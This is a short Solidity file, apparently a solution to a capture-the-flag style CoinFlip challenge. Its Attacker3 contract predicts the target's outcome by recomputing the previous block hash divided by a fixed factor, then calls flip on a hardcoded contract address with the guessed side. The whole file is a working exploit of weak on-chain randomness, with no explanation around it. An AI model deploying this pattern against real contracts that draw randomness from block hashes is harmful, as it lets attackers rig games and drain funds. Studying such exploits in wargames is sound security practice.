// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

abstract contract CoinFlip {
    function flip(bool _guess) public virtual returns (bool);
}

contract Attacker3 {
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip target = CoinFlip(0x9d5b66e9D86905ed473CbE31DCABa006a2640Fbe);

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        target.flip(side);
    }
}
